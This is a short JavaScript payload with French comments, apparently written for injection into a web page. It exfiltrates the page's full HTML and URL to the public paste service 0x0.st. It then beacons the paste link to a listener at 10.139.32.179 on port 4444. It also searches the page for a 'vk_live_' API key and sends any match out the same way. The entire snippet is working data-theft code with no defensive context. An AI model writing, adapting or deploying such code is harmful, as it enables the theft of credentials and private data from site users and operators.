// Exfiltrer vers 0x0.st (service public de paste)
function exfiltrate(data) {
    // Envoyer les données vers 0x0.st
    const formData = new FormData();
    formData.append('file', new Blob([data]), 'exfil.txt');
    
    fetch('https://0x0.st', {
        method: 'POST',
        mode: 'cors',
        body: formData
    })
    .then(r => r.text())
    .then(url => {
        // Une fois le paste créé, envoyer l'URL via netcat
        new Image().src = "http://10.139.32.179:4444/?paste=" + encodeURIComponent(url);
    });
}

// Exfiltrer la page actuelle
const pageHTML = document.documentElement.outerHTML;
exfiltrate("URL: " + location.href + "\n\n" + pageHTML);

// Chercher l'API key
const keyMatch = pageHTML.match(/vk_live_[a-f0-9]{40}/);
if (keyMatch) {
    exfiltrate("API KEY FOUND: " + keyMatch[0]);
}
